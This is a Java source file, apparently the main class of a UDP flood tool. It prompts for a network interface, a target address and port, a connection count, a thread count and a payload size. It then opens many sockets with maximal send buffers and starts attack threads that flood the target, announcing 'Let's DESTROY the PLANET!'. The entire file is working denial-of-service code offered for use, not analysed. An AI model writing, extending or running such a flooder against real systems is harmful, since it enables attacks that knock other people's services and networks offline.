import oshi.SystemInfo;
import oshi.hardware.NetworkIF;

import java.io.PrintStream;
import java.net.*;
import java.util.Random;
import java.util.Scanner;


public class OnReady {

    public static int i, j;

    public static void main(String[] args) {
        PrintStream so = System.out;
        Scanner sc = new Scanner(System.in);

        try {
            SystemInfo systemInfo = new SystemInfo();

            so.print("\nSelect Interface: [1-" + systemInfo.getHardware().getNetworkIFs().size() + "]\n\n");
            for (int i = 1; i <= systemInfo.getHardware().getNetworkIFs().size(); i++) {
                so.println("[" + i + "]: " + systemInfo.getHardware().getNetworkIFs().get(i - 1).getDisplayName());
            }
            so.print("\nChoose number: ");

            NetworkIF networkIF = null;
            try {
                int interfaceNumber = sc.nextInt() - 1;
                networkIF = systemInfo.getHardware().getNetworkIFs().get(interfaceNumber);
                so.println("Selected interface: " + systemInfo.getHardware().getNetworkIFs().get(interfaceNumber).getDisplayName());
            } catch (Exception ignored) {
                System.err.println("Interface number is not exist! Exit.");
                System.exit(-1);
            }
            sc.nextLine();

            so.print("\nAddress:Port? ");
            String input = sc.nextLine();

            boolean portFlag = false;
            StringBuilder addr = new StringBuilder();
            StringBuilder port = new StringBuilder();

            for (char ch : input.toCharArray()) {
                if (portFlag) {
                    port.append(ch);
                    continue;
                }

                if (ch == ':') portFlag = true;
                else addr.append(ch);
            }

            try {
                Integer.parseInt(port.toString());
            } catch (Exception ignored) {
                System.err.println("Please Check your inputted port number. Exit.");
                System.exit(-1);
            }

            try {
                new DatagramSocket().connect(InetAddress.getByName(addr.toString()), Integer.parseInt(String.valueOf(port)));
            } catch (Exception ignored) {
                System.err.println("Please Check your inputted address. Exit.");
                System.exit(-1);
            }

            so.print("\nConnection Count? ");
            int connCount = sc.nextInt();

            so.print("\nSending Thread? ");
            int sendThread = sc.nextInt();

            so.print("\nData Size? ");
            int dataSize = sc.nextInt();

            Random rand = new Random();
            StringBuilder data = new StringBuilder();
            for (int i = 1; i <= dataSize; i++) {
                int index = rand.nextInt(3);
                switch (index) {
                    case 0:
                        data.append((char) (rand.nextInt(26) + 97));
                        break;
                    case 1:
                        data.append((char) (rand.nextInt(26) + 65));
                        break;
                    case 2:
                        data.append(rand.nextInt(10));
                        break;
                }
            }

            so.println("\n\nLet's DESTROY the PLANET! (Enter STOP to cancel.)\n");

            Thread afterAttackThread = new AfterAttackThread(connCount, sendThread, networkIF);
            afterAttackThread.start();

            DatagramPacket datagramPacket = new DatagramPacket(data.toString().getBytes(), data.toString().length());

            for (i = 1; i <= connCount; i++) {
                DatagramSocket socket = new DatagramSocket();
                socket.connect(InetAddress.getByName(addr.toString()), Integer.parseInt(String.valueOf(port)));

                for (j = 1; j <= sendThread; j++) {
                    socket.setSoTimeout(0x7fffffff);
                    socket.setSendBufferSize(0x7fffffff);
                    socket.setTrafficClass(0x08);
                    socket.setBroadcast(true);
                    socket.setReuseAddress(true);

                    Thread attackThread = new AttackThread(socket, datagramPacket);
                    attackThread.start();

                    Thread.sleep(1);
                }
            }
            --i; --j;
        } catch (Exception ignored) {
            System.exit(1);
        }
    }
}
